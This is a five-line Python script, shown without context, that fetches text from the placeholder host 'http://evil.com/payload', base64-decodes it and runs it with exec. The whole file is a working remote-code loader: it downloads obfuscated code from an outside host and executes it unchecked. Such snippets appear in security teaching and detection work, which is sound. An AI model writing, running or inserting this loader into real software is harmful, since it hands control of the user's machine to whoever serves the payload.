import base64
import requests
url = 'http://evil.com/payload'
data = requests.get(url).text
exec(base64.b64decode(data))